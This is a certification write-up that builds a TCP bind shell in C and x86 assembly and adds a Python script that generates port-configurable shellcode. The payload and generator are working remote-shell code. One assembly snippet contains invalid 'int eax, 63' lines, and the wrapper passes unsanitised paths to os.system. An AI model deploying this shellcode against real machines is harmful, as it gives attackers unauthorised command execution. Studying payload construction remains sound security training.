Title: SLAE32 - Assignment 1
Date: 2022-06-03T18:10:26.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the <em>SecurityTube Linux Assembly Expert Certification</em>:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: <strong>PA-30398</strong></p><h2 id="source-code">Source code</h2><!--kg-card-begin: markdown--><p>The full source code is stored inside the repository created for this Exam: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/1/attempt">rbctee/SlaeExam</a>.</p>
<p>List of files:</p>
<ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/first/shell_bind_tcp.c">attempt/first/shell_bind_tcp.c</a>: first attempt at writing a Bind Shell in <code>C</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/first/shell_bind_tcp.nasm">attempt/first/shell_bind_tcp.nasm</a>: first attempt at writing a Bind Shell in <code>Assembly</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/shell_bind_tcp.c">attempt/final/shell_bind_tcp.c</a>: final attempt at writing a Bind Shell in <code>C</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/shell_bind_tcp.nasm">attempt/final/shell_bind_tcp.nasm</a>: final attempt at writing a Bind Shell in <code>Assembly</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/automation/wrapper.py">attempt/final/automation/wrapper.py</a>: <code>python</code> script to automate the generation of shellcode based on arbitrary TCP ports</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/automation/template.nasm">attempt/final/automation/template.nasm</a>: generic template used by <code>wrapper.py</code></li>
</ul>
<!--kg-card-end: markdown--><h2 id="first-attempt">First Attempt</h2><p>Follows the visual representation of the first implementation:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image.png" class="kg-image" alt="My first implementation of a TCP Bind Shell" loading="lazy" width="297" height="702"><figcaption>My first implementation of a TCP Bind Shell</figcaption></figure><h3 id="c-code">C code</h3><p>Based on the graph previously shown, the first step is to create TCP socket that listens on a specific combination of IP address and TCP port.</p><p>For now I chose to use <code>0.0.0.0:4444</code>; in the chapter <strong>Automation</strong> I explain how to use a <code>python</code> script to specify arbitrary values for the TCP port.</p><pre><code class="language-cpp">int server_socket_fd;
struct sockaddr_in server_address;

// create a TCP socket
server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</code></pre><p>The <code>socket()</code> function creates a socket, which is represented by a <code>File Descriptor</code> (abbreviated as <code>fd</code>) on Linux systems.</p><pre><code class="language-cpp">server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = INADDR_ANY;
server_address.sin_port = htons(4444);

// bind the socket to 0.0.0.0:4444
bind(server_socket_fd, (struct sockaddr *)&amp;server_address, sizeof(server_address));

// set it as a passive socket that listens for connections
listen(server_socket_fd, 1);</code></pre><p>Let's look at the code above: initially, a socket is created through the <code>socket</code> function, which returns a <code>File Descriptor</code>.</p><p>The arguments <code>SOCK_STREAM</code> and <code>IPPROTO_TCP</code> allow for the creation of a <code>TCP</code> socket.</p><p>After that, you have to to specify the address and port number on which to bind the socket. In this case, I used <code>INADDR_ANY</code> (i.e. <code>0.0.0.0</code>) and the typical TCP port used by <em>Metasploit</em> (<code>4444</code>).</p><p>These variables are passed to the <code>bind</code> function, which performs the binding operation. However, if you were to run <code>ss -tnl</code> (or <code>netstat -plnt</code>), you wouldn't find the current socket yet.</p><p>The reason is that we have to execute the <code>listen</code> function first. Let's look at its <a href="https://man7.org/linux/man-pages/man2/listen.2.html">prototype</a>:</p><pre><code class="language-cpp">#include &lt;sys/socket.h&gt;

int listen(int sockfd, int backlog);</code></pre><!--kg-card-begin: markdown--><p>It accepts 2 arguments:</p>
<ol>
<li>the file descriptor of a TCP socket</li>
<li><em>the maximum length to which the queue of pending connections for sockfd may grow</em> (ref: <a href="https://man7.org/linux/man-pages/man2/listen.2.html">man page</a>)</li>
</ol>
<p>Before being able to receive data and execute commands, the socket has to accept a connection from incoming clients:</p>
<!--kg-card-end: markdown--><pre><code class="language-cpp">int client_socket_fd, bytes_read, size_client_socket_struct;
struct sockaddr_in client_address;

// accept incoming connections
size_client_socket_struct = sizeof(struct sockaddr_in);
client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&amp;client_address, (socklen_t *)&amp;size_client_socket_struct);</code></pre><p>Accept a client connection and place its socket inside the variable <code>client_address</code>.</p><pre><code class="language-cpp">// redirect standard input/output/error to the socket
dup2(client_socket_fd, 0);
dup2(client_socket_fd, 1);
dup2(client_socket_fd, 2);</code></pre><p>I used <code>dup2</code> in order to redirect <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> of the current shell towards the client socket, so it acts as an interactive shell.</p><p>What's missing now is the code that executes the commands sent by the client:</p><pre><code class="language-cpp">char client_command[1024] = {0};

char *const parmList[] = {"/bin/sh", "-c", client_command, NULL};
char *const envParms[] = {NULL};

// receive data from client (max 1024 bytes)
while ((bytes_read = recv(client_socket_fd, &amp;client_command, 1024, 0)) &gt; 0) {
    // execute client command
    system(client_command);
    memset(client_command, 0, sizeof(client_command));
}</code></pre><p>The loop right above checks if the client has sent any data. If so, it executes the command and sends <code>input</code>/<code>output</code>/<code>error</code> to the client socket.</p><p>Finally, it uses the function <code>memset</code> to clear the buffer that stores the command, in order to avoid previous commands from corrupting next ones.</p><p>The full C program can be found inside the <a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/first/shell_bind_tcp.c">repo created for this exam</a>.</p><h3 id="assembly">Assembly</h3><h4 id="socket-creation">Socket Creation</h4><!--kg-card-begin: markdown--><p>The first function we need to convert into Assembly is <code>socket</code>. Unfortunately, there isn't a specific syscall that creates a socket, although there is one named <code>socketcall</code>. Follows an excerpt taken from its <a href="https://linux.die.net/man/2/socketcall">man page</a>:</p>
<blockquote>
<p><code>int socketcall(int call, unsigned long *args);</code></p>
<p><code>socketcall()</code> is a common kernel entry point for the socket system calls. <em>call</em> determines which socket function to invoke. <code>args</code> points to a block containing the actual arguments, which are passed through to the appropriate call.</p>
</blockquote>
<p>Based on this description and the function prototype, it seems we first need to find the right <code>call</code> value that references <code>socket()</code>. Although man pages don't list all the possible values for this argument (please contact me if you find them inside the man pages), we can take a look at the source code of the Linux kernel.</p>
<p>To be more specific, <a href="https://github.com/torvalds/linux/blob/master/net/socket.c#L2901">this page</a> contains the implementation of the <code>socketcall</code> function, listing several possible value for the argument <code>call</code>:</p>
<!--kg-card-end: markdown--><pre><code class="language-cpp">// ...

switch (call) {

  case SYS_SOCKET:
    err = __sys_socket(a0, a1, a[2]);
    break;

  case SYS_BIND:
    err = __sys_bind(a0, (struct sockaddr __user *)a1, a[2]);
    break;

  case SYS_CONNECT:
    err = __sys_connect(a0, (struct sockaddr __user *)a1, a[2]);
    break;

  case SYS_LISTEN:
    err = __sys_listen(a0, a1);
    break;

  case SYS_ACCEPT:
    err = __sys_accept4(a0, (struct sockaddr __user *)a1, (int __user *)a[2], 0);
    break;

  case SYS_GETSOCKNAME:
    err = __sys_getsockname(a0, (struct sockaddr __user *)a1, (int __user *)a[2]);
    break;

// ...</code></pre><p>Nevertheless, it isn't quite what we want: it doesn't show the integer values for these values. Digging a bit deeper, I found them inside the file <a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27">include/uapi/linux/net.h</a> of the Linux kernel.</p><pre><code class="language-cpp">#define SYS_SOCKET            1      /*     sys_socket(2)          */
#define SYS_BIND              2      /*     sys_bind(2)            */
#define SYS_CONNECT           3      /*     sys_connect(2)         */
#define SYS_LISTEN            4      /*     sys_listen(2)          */
#define SYS_ACCEPT            5      /*     sys_accept(2)          */
#define SYS_GETSOCKNAME       6      /*     sys_getsockname(2)     */
#define SYS_GETPEERNAME       7      /*     sys_getpeername(2)     */
#define SYS_SOCKETPAIR        8      /*     sys_socketpair(2)      */
#define SYS_SEND              9      /*     sys_send(2)            */
#define SYS_RECV              10     /*     sys_recv(2)            */
#define SYS_SENDTO            11     /*     sys_sendto(2)          */
#define SYS_RECVFROM          12     /*     sys_recvfrom(2)        */
#define SYS_SHUTDOWN          13     /*     sys_shutdown(2)        */
#define SYS_SETSOCKOPT        14     /*     sys_setsockopt(2)      */
#define SYS_GETSOCKOPT        15     /*     sys_getsockopt(2)      */
#define SYS_SENDMSG           16     /*     sys_sendmsg(2)         */
#define SYS_RECVMSG           17     /*     sys_recvmsg(2)         */
#define SYS_ACCEPT4           18     /*     sys_accept4(2)         */
#define SYS_RECVMMSG          19     /*     sys_recvmmsg(2)        */
#define SYS_SENDMMSG          20     /*     sys_sendmmsg(2)        */</code></pre><p>Now we should be able to use the <code>socket</code> function to create a TCP socket.</p><pre><code class="language-nasm">; Author: Robert Catalin Raducioiu (rbct)

global _start

section .text

_start:

    ; SYSCALLS for 32-bit x86 Linux systems:
    ; /usr/include/i386-linux-gnu/asm/unistd_32.h
    ; or https://web.archive.org/web/20160214193152/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html

    ; sys_socketcall
    xor eax, eax
    mov ebx, eax
    mov ecx, eax
    mov al, 102

    ; SYS_SOCKET
    mov bl, 1

    ; IPPROTO_TCP
    mov cl, 6
    push ecx

    ; SOCK_STREAM (0x00000001)
    push ebx

    ; AF_INET
    mov cl, 2
    push ecx

    ; Pointer to the arguments for SYS_SOCKET call
    mov ecx, esp

    ; call syscall
    int 0x80</code></pre><p>Debugging the program with <code>gdb</code> and stopping after the syscall I noticed the following output:</p><pre><code class="language-bash">lsof -p PID

# COMMAND    PID USER   FD   TYPE     DEVICE SIZE/OFF  NODE NAME
# tcp_bind_ 4339 rbct  cwd    DIR        8,1     4096  6052 /home/rbct/exam/assignment_1
# tcp_bind_ 4339 rbct  rtd    DIR        8,1     4096     2 /
# tcp_bind_ 4339 rbct  txt    REG        8,1      522  6053 /home/rbct/exam/assignment_1/tcp_bind_shell
# tcp_bind_ 4339 rbct    0u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    1u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    2u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    3u  unix 0x00000000      0t0 89245 socket
# tcp_bind_ 4339 rbct    4u  unix 0x00000000      0t0 89246 socket
# tcp_bind_ 4339 rbct    5r  FIFO        0,8      0t0 89247 pipe
# tcp_bind_ 4339 rbct    6w  FIFO        0,8      0t0 89247 pipe
# tcp_bind_ 4339 rbct    7u  sock        0,7      0t0 89254 can't identify protocol</code></pre><p>It successfully created a socket (identified by the file descriptor <code>7</code>, <code>u</code> specifies <code>read</code> and <code>write</code> permissions according to the man page of <code>lsof</code>).</p><h4 id="socket-binding">Socket Binding</h4><p>Next is the turn of the <code>bind</code> function.</p><pre><code class="language-cpp">server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = INADDR_ANY;
server_address.sin_port = htons(4444);

// bind the socket to 0.0.0.0:4444
bind(server_socket_fd, (struct sockaddr *)&amp;server_address, sizeof(server_address));</code></pre><p>First, I need to understand how to create a <code>sockaddr_in</code> struct (variable <code>server_address</code>).<br>Based on <a href="https://man7.org/linux/man-pages/man7/ip.7.html">the Linux manual</a>, the definition of the struct looks like this:</p><pre><code class="language-cpp">struct sockaddr_in {
  sa_family_t    sin_family; /* address family: AF_INET */
  in_port_t      sin_port;   /* port in network byte order */
  struct in_addr sin_addr;   /* internet address */
};

/* Internet address */
struct in_addr {
  uint32_t       s_addr;     /* address in network byte order */
}</code></pre><p>Now we need the type definition of <code>sa_family_t</code>, which I found defined inside the file <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/socket.h#L26">/usr/include/socket.h</a>:</p><pre><code class="language-cpp">typedef __kernel_sa_family_t    sa_family_t;</code></pre><p>According to the file <a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/socket.h#L10">include/uapi/linux/socket.h</a>, it's an <code>unsigned short</code> integer:</p><pre><code class="language-cpp">typedef unsigned short __kernel_sa_family_t;</code></pre><p>On 32-bit x86 systems, an unsigned short integer requires <code>2 bytes</code> of data. Now there's only <code>in_port_t</code> left. The latter is defined inside the file <a href="https://man7.org/linux/man-pages/man0/netinet_in.h.0p.html">netinetin.h</a>:</p><blockquote><em>The <code>&lt;netinet/in.h&gt;</code> header shall define the following types:</em><br><br><em>- <code>in_port_t</code> Equivalent to the type uint16_t as described in <code>&lt;inttypes.h&gt;</code></em></blockquote><p>It seems to be an <code>unsigned short</code> integer, just like <code>sa_family_t</code>.<br>Based on all of this information, now the struct should look like this:</p><pre><code class="language-cpp">struct sockaddr_in {
  unsigned short      sin_family;
  unsigned short      sin_port;
  struct in_addr      sin_addr;
};

struct in_addr sin_addr {
  unsigned int        s_addr;
}</code></pre><p>One of the mistakes I made is to sum the bytes of the variables in order to calculate the size of the struct (<code>short</code> + <code>short</code> + <code>int</code> = <code>8</code> bytes).</p><p>Long story short: many <code>struct</code> objects use <code>padding</code> for compatibility with different systems.<br>Moreover, don't forget the definition of <code>sys_socketcall</code>:</p><pre><code class="language-cpp">int syscall(SYS_socketcall, int call, unsigned long *args);</code></pre><p>In particular, in the case of the <code>bind</code> function, you can't use <code>ECX</code>, <code>EDX</code>, and so on, because they would be passed to <code>sys_socketcall</code>.</p><p>Just like before (see chapter <em>Socket creation</em>), the arguments are passed as a pointer, using the <code>ECX</code> register.</p><p>Follows the assembly code:</p><pre><code class="language-nasm">; INADDR_ANY (0x00000000)
dec ebx
push ebx

; 0x0002 -&gt; AF_INET
; 0x115c -&gt; htons(4444)

push WORD 0x5c11

mov bl, 2
push WORD bx
; push 0x5c110002

; save the pointer to the struct for later
mov ecx, esp

; 3rd argument of bind(): size of the struct
; push 16
rol bl, 3
push ebx

; 2nd argument of bind(): pointer to the struct
push ecx

; 1st argument of bind(): file descriptor of the server socket
mov esi, eax
push eax

; syscall socketcall
xor eax, eax
mov al, 102

; 1st argument of socketcall(): call SYS_BIND
ror bl, 3

; 2nd argument of socketcall(): pointer to the parameters of bind()
mov ecx, esp

int 0x80</code></pre><!--kg-card-begin: markdown--><p>You may be wondering why I used <code>PUSH 16</code> for the 3rd argument of <code>bind()</code>, instead of the current size of struct, which is 8 bytes. As I said before: it's all about <code>padding</code>.</p>
<p>Initially, if I used <code>PUSH 8</code>, the call to <code>bind()</code> would return the value <code>0xffffffea</code> (<code>EINVAL</code>), which means one of the arguments is invalid.</p>
<p>Later, I discovered the right size of the struct is <code>16</code> bytes (doing a simple <code>printf</code> of <code>sizeof(server_address)</code>). However, the real reason can be inferred from the definition of the struct:</p>
<!--kg-card-end: markdown--><pre><code class="language-cpp">#define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */

struct sockaddr_in {
  __kernel_sa_family_t  sin_family;     /* Address family               */
  __be16                sin_port;       /* Port number                  */
  struct in_addr        sin_addr;       /* Internet address             */

  /* Pad to size of `struct sockaddr'. */
  unsigned char         __pad[__SOCK_SIZE__ - sizeof(short int) -
                        sizeof(unsigned short int) - sizeof(struct in_addr)];
};</code></pre><p>As you can see, it uses padding bytes in order to reach a size of <code>16</code> bytes.</p><h4 id="listening-for-connections">Listening for Connections</h4><p><br>Next, we need to convert the following line into assembly:</p><pre><code class="language-cpp">// set it as a passive socket that listens for connections
listen(server_socket_fd, 1);</code></pre><p>Based on previous findings, the second argument of <code>socketcall</code> should be <code>SYS_LISTEN</code> (<code>4</code>).</p><p>Follows the assembly code:</p><pre><code class="language-nasm">; 2nd argument of listen(): set backlog (connection queue size) to 1    mov bl, 1
push 1</code></pre><p>I thought <code>push 1</code> is interpreted as <code>push 0x00000001</code>, but <a href="http://sparksandflames.com/files/x86InstructionChart.html">it seems</a> the opcode <code>6A</code> can be used to push a single byte as a 32-bit value.</p><pre><code class="language-nasm">; 1st argument of listen(): file descriptor of the server socket
push esi

; syscall socketcall
mov eax, ebx
mov al, 102

; 1st argument of socketcall(): SYS_LISTEN call
; mov ebx, 4
rol bl, 2

; 2nd argument of socketcall(): pointer to listen() arguments
mov ecx, esp

; execute listen()
int 0x80</code></pre><h4 id="accepting-connections">Accepting Connections</h4><p>It's time to accept incoming connections from clients (max 1 client in this case). We need to convert the following C code into assembly:</p><pre><code class="language-cpp">size_client_socket_struct = sizeof(struct sockaddr_in);
client_socket_fd = accept(
    server_socket_fd,
    (struct sockaddr *)&amp;client_address,
    (socklen_t *)&amp;size_client_socket_struct
);</code></pre><p>Follows the assembly code:</p><pre><code class="language-nasm">; 3rd argument of accept(): size of client_address struct
rol bl, 2
push ebx

; 2nd argument of accept: client_address struct, in this case empty
xor ebx, ebx
push ebx
push ebx

; 1st argument of accept: file descriptor of the server socket
push esi

; syscall socketcall
; mov eax, 102
mov eax, ebx
mov al, 102

; 1st argument of socketcall(): SYS_ACCEPT call
mov bl, 5

; 2nd argument of socketcall(): pointer to accept() arguments
mov ecx, esp

; execute accept()
int 0x80</code></pre><h4 id="io-redirection">I/O Redirection</h4><p>As mentioned previously, the redirection of <code>input</code>/<code>output</code>/<code>error</code> is performed by means of the function <code>dup2</code>. The call to <code>accept()</code> returns the File Descriptor associated with the Client Socket.</p><pre><code class="language-cpp">dup2(client_socket_fd, 0);
dup2(client_socket_fd, 1);
dup2(client_socket_fd, 2);</code></pre><p>According to the file <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code>, <code>dup2</code> is the syscall <code>#63</code>. Given this information, we're now ready to convert the code above into assembly:</p><pre><code class="language-nasm">    ; save the Client File Descriptor for later use
    mov edi, eax

    ; dup2(client_socket_fd, 0)
    int eax, 63
    int ebx, edi
    int ecx, 0
    int 0x80

    ; dup2(client_socket_fd, 1)
    int eax, 63
    int ebx, edi
    int ecx, 1
    int 0x80

    ; dup2(client_socket_fd, 2)
    int eax, 63
    int ebx, edi
    int ecx, 02
    int 0x80</code></pre><p>This is good enough, but I wanted a better approach, one that uses fewer bytes and it's also free of <code>NULL</code> ones:</p><pre><code class="language-nasm">    ; loop counter (repeats dup2() three times)
    mov ecx, ebx
    mov bl, 3

    ; save Client File Descriptor for later use
    mov edi, eax

RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov al, 63

    ; Client file descriptor
    mov ebx, edi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate</code></pre><p>In the code above, the <code>loop</code> instruction is used to repeat the routine <code>RepeatDuplicate</code> three times, for <code>error</code> (fd: 2), <code>output</code> (fd: 1), and <code>input</code> (fd: 0).</p><h4 id="command-execution">Command Execution</h4><p>Finally, to have a fully-functional bind shell, we need to convert the following block of code into assembly:</p><pre><code class="language-cpp">// receive data from client (max 1024 bytes)
while ((bytes_read = recv(client_socket_fd, &amp;client_command, 1024, 0)) &gt; 0) {
    // execute client command
    system(client_command);
    memset(client_command, 0, sizeof(client_command));
}</code></pre><!--kg-card-begin: markdown--><p>Follows the syscall numbers:</p>
<ul>
<li><code>recv</code>: invoked via <code>socketcall</code> (<code>SYS_RECV</code>: <code>10</code>)</li>
<li><code>system</code>: it's a wrapper, so we're going to use <code>execve</code></li>
<li><code>memset</code>: there's no syscall</li>
</ul>
<p>It seems we're missing some functions. Therefore, I decided to reimplement it manually:</p>
<!--kg-card-end: markdown--><figure class="kg-card kg-code-card"><pre><code class="language-nasm">ReceiveData:

    xor ecx, ecx
    mov ebx, ecx
    mov ch, 4
    lea eax, [ReceivedData]

ClearCommandBuffer:

    mov [eax], BYTE bl
    inc eax 
    dec ecx 
    loop ClearCommandBuffer</code></pre><figcaption>Implementation of <code>memset</code>, loop 1024 times in order to clear the buffer</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">    ; 4th argument of recv(): NO flags
    push ebx

    ; 3rd argument of recv(): size of the buffer that stores the command received
    xor ebx, ebx
    inc ebx
    rol bx, 10
    push ebx

    ; 2nd argument of recv(): pointer to the aforementione buffer
    push ReceivedData

    ; Client File Descriptor
    push edi

    ; syscall #102: socketcall()
    xor eax, eax
    mov al, 102

    ; 1st argument of socketcall(): call SYS_RECV
    xor ebx, ebx
    mov bl, 10

    ; 2nd argument of socketcall(): pointer to the arguments of SYS_RECV
    mov ecx, esp

    ; invoke socketcall()
    int 0x80</code></pre><figcaption>Use <code>socketcall</code> to call <code>recv</code> and receive the command to be executed</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">    cmp al, 0xff
    je Exit

    xor eax, eax
    mov al, 2
    int 0x80

    ; if the return value of fork() == 0, it means we're in the child process
    xor ebx, ebx
    cmp eax, ebx
    jne ReceiveData</code></pre><figcaption>After the <code>fork</code>, the <strong>parent</strong> process waits for data to be received, while the <strong>child</strong> process executes the command received just now</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">ExecuteCommand:

    xor esi, esi
    push esi

    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp</code></pre><figcaption>String <code>//bin/sh</code></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">    mov eax, esi
    mov ax, 0x632d
    push eax

    mov eax, esp</code></pre><figcaption>String <code>-c</code></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">    push esi
    push ReceivedData
    push eax
    push ebx

    mov eax, esi
    mov al, 11
    mov ecx, esp

    push esi
    mov edx, esp

    int 0x80</code></pre><figcaption>After executing the command (syscall 11: <code>execve</code>), the child process exits gracefully</figcaption></figure><pre><code class="language-nasm">Exit:

    mov eax, esi
    inc eax
    int 0x80

section .bss

    ReceivedData:   resb 1024</code></pre><p>To summarise: after redirecting input, output, and error, the program waits to receive data from the Client Socket, using the routine <code>ReceiveData</code>, which also clear the buffer to prevent corruption.<br>After receiving the command, the <code>fork</code> syscall is employed.</p><p>The reason is due to how <code>execve</code> works: once it executes the command, it process exits, so it wouldn't return to receiving other data. In this case, forking allows us to keep a <code>parent process</code> that receives commands, and spawn a <code>child process</code> for each command executed.</p><h2 id="final-attempt">Final attempt</h2><p>Follows the visual representation of the final implementation:<br></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-1.png" class="kg-image" alt loading="lazy" width="274" height="518"><figcaption>My final implementation of a TCP Bind Shell</figcaption></figure><h3 id="c-code-1">C Code</h3><p>After finishing the second assignment, I noticed the shellcode I wrote uses too many instructions.</p><p>To be more specific, the final block (<code>recv-memset-system</code>) is superfluous. In fact, once you redirect <code>stdin</code>, <code>stdout</code> and <code>stderr</code>, you can simply spawn a shell and the job is done:</p><pre><code class="language-cpp">#include &lt;netinet/ip.h&gt;

int main() {
    int server_socket_fd, client_socket_fd, size_client_socket_struct;
    struct sockaddr_in server_address, client_address;

    // create a TCP socket
    server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(4444);

    // bind the socket to 0.0.0.0:4444
    bind(server_socket_fd, (struct sockaddr *)&amp;server_address, sizeof(server_address));

    // passive socket that listens for connections
    listen(server_socket_fd, 1);

    // accept incoming connection
    size_client_socket_struct = sizeof(struct sockaddr_in);
    client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&amp;client_address, (socklen_t *)&amp;size_client_socket_struct);

    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    system("/bin/bash");
}</code></pre><h3 id="assembly-1">Assembly</h3><p>Here's the assembly code that starts from the <code>RepeatDuplicate</code> label:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov eax, 63

    ; Client file descriptor
    mov ebx, edi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate

SpawnShell:

    push ecx

    ; argv, 2nd argument of execve
    mov ecx, esp

    ; envp, 3rd argument of execve
    mov edx, esp</code></pre><figcaption><code>ECX</code> and <code>EDX</code> are pointers to <code>NULL</code>, so <strong>argv</strong> and <strong>envp</strong> are empty</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    ; exceve syscall
    xor eax, eax
    mov al, 11
    int 0x80</code></pre><figcaption>Call <code>execve</code> on <code>//bin/sh</code></figcaption></figure><p>As you can see, after it redirects input, output, and error, the <code>execve</code> syscall spawns an SH shell.</p><h2 id="automation">Automation</h2><p>One of the requirements of the assignment is to be able to easily configure the TCP port. I decided to write <code>python</code> script that acts as a wrapper (script named <code>wrapper.py</code>):</p><figure class="kg-card kg-code-card"><pre><code class="language-py">import os
import sys
import argparse
import traceback
import subprocess


def print_shellcode(object_file_path):

    try:
        command = ["objcopy", "-O", "binary", "-j", ".text", object_file_path, "/dev/stdout"]
        proc = subprocess.run(command, stdout=subprocess.PIPE)
    except:
        print(traceback.format_exc())
        sys.exit(1)</code></pre><figcaption>The binary <code>objcopy</code> belongs to the package <code>binutils</code>, which must be installed, otherwise the program will throw an error</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">    shellcode = proc.stdout
    shellcode_string = ""

    for b in shellcode:
        shellcode_string += f"\\x{b:02x}"

    if 0x00 in shellcode:
        print(f"[!] Found NULL byte in shellcode")

    print(f"[+] Shellcode length: {len(shellcode)} bytes")
    print(f"[+] Shellcode:")
    print(f'"{shellcode_string}";')</code></pre><figcaption>I wrote the function <code>print_shellcode</code> in order to extract the executable code from the <code>.text</code> section of the object file. It allows you to easily paste the shellcode into the shellcode runner</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">def generate_shellcode(output_file_path):

    object_file_path = output_file_path.replace(".nasm", ".o", 1)
    executable_path = output_file_path.replace(".nasm", "", 1)

    try:
        os.system(f"nasm -f elf32 -o {object_file_path} {output_file_path}")
        os.system(f"ld -m elf_i386 -o {executable_path} {object_file_path}")</code></pre><figcaption>The program also requires <code>nasm</code> and <code>ld</code>, the latter should be present by default on Linux systems</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">        print(f"[+] Object file generated at {output_file_path}")
        print(f"[+] Executable binary generated at {executable_path}")

        print_shellcode(object_file_path)
    except:
        print(traceback.format_exc())
        sys.exit(1)

def replace_template_values(template_name, tcp_port, output_file_path):

    with open(template_name) as f:
        template_code = f.read()

    tcp_port_hex = (tcp_port).to_bytes(2, "little").hex()

    if '00' in tcp_port_hex:
        if '00' in tcp_port_hex[:2]:
            non_null_byte = tcp_port_hex[2:]
            replace_code = f"mov bl, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
        else:
            non_null_byte = tcp_port_hex[:2]
            replace_code = f"mov bh, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
    else:
        replace_code = f"push WORD 0x{tcp_port_hex}"</code></pre><figcaption>These last instructions allows you avoid <code>NULL</code> bytes in the TCP port number. For example, the port <code>256</code> is converted to <code>0x0001</code> (big endian), while port <code>80</code> is converted to <code>0x5000</code></figcaption></figure><pre><code class="language-py">    template_code = template_code.replace("{{ TEMPLATE_TCP_PORT }}", replace_code, 1)
    
    with open(output_file_path, 'w') as f:
        f.write(template_code)

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, help='TCP Port for the Bind Shell', required=True, metavar="[1-65535]")
    parser.add_argument('-t', '--template', help='Path of the NASM template file. Example: -t /tmp/template.nasm', required=True)
    parser.add_argument('-o', '--output', help='Path for the output file. Example: -o /tmp/output.nasm', required=True)

    args = parser.parse_args()

    tcp_port = args.port
    if tcp_port not in range(1, 65536):
        print(f"[!] Argument '--port' must be in range [1-65535]")
        sys.exit(1)

    shellcode_template = args.template
    output_file_path = args.output

    replace_template_values(shellcode_template, tcp_port, output_file_path)
    generate_shellcode(output_file_path)


if __name__ == '__main__':

    main()</code></pre><p>Thanks to <code>argparse</code>, when you run the script, it asks you for the required arguments:</p><pre><code class="language-bash">python3 script.py -h

# usage: script.py [-h] -p [1-65535] -t TEMPLATE -o OUTPUT

# optional arguments:
#   -h, --help            show this help message and exit
#   -p [1-65535], --port [1-65535]
#                         TCP Port for the Bind Shell
#   -t TEMPLATE, --template TEMPLATE
#                         Path of the NASM template file. Example: -t /tmp/template.nasm
#   -o OUTPUT, --output OUTPUT
#                         Path for the output file. Example: -o /tmp/output.nasm</code></pre><p>If you pass the required arguments, it finally prints the shellcode which you can copy into a shellcode runner. Follows an example:</p><pre><code class="language-bash">python3 script.py -p 80 -t ./template.nasm -o /tmp/output.nasm

# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 133 bytes
# [+] Shellcode:
